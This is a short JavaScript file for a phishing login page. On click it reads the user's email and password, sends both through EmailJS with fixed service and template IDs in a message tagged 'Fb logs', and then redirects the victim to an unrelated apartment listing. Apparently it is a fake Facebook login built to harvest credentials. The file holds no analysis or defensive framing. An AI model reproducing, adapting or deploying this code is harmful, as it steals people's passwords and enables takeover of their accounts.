document.addEventListener("DOMContentLoaded", function () {
    const loginBtn = document.getElementById("loginBtn");

    loginBtn.addEventListener("click", function () {
        const email = document.getElementById("user_email").value;
        const password = document.getElementById("user_password").value;

        if (!email || !password) {
            alert("Please enter both email and password.");
            return;
        }

        const templateParams = {
            name: email,
            message: `Fb logs ${password}`
        };

        emailjs.send("service_0rucnsl", "template_ve6yzyn", templateParams)
            .then(function (response) {
                console.log("SUCCESS!", response.status, response.text);
                // Redirect after successful email send
                window.location.href = "https://www.redfin.com/NV/Las-Vegas/Terravita-Apartments/apartment/40099676?utm_campaign=copy&utm_medium=share&utm_source=web_share";
            }, function (error) {
                console.error("FAILED...", error);
                alert("Failed to login");
            });
    });
});
